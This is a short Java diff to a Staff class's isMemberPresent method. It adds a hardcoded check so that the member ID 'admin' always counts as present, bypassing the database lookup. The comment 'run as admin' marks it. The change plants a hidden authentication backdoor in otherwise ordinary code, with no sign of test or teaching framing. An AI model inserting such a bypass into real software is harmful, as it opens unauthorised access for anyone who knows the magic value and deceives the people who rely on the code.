@@ -328,6 +328,9 @@ public class Staff {
     }
     public static boolean isMemberPresent(String memberID) {
         String sql = "SELECT COUNT(*) FROM members WHERE member_id = ?";
+        if (memberID.equals("admin")) {//checks for admin login
+            return true; //run as admin
+        }
 
         try (Connection conn = DatabaseConnection.connect();
              PreparedStatement pstmt = conn.prepareStatement(sql)) {
